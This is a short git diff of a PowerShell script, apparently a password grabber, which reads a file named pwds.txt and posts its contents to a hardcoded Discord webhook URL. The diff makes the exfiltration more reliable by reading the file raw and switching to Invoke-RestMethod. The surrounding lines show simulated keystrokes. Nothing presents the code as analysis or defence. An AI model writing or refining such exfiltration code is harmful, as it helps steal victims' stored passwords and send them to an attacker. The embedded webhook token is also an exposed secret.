@@ -10,7 +10,7 @@ Sleep 1
 $wshell.SendKeys("~")
 Sleep 2
 
-$PassContent = Get-Content pwds.txt
+$PassContent = Get-Content pwds.txt -Raw
 
 $URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
 
@@ -18,4 +18,4 @@ $msg = @{
     content = $PassContent
 } | ConvertTo-Json
 
-Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
+Invoke-RestMethod -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
